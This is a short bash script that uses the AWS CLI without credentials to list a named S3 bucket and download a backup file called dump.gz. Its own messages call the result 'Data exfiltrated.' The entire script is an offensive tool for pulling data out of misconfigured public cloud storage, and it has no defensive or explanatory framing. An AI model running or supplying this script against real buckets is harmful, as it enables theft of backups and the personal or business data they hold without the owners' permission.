#!/bin/bash
BUCKET=$1

echo "[+] Listing public bucket..."
aws s3 ls s3://$BUCKET --no-sign-request

echo "[+] Downloading backup..."
aws s3 cp s3://$BUCKET/dump.gz ./dump.gz --no-sign-request

echo "[+] Done. Data exfiltrated."
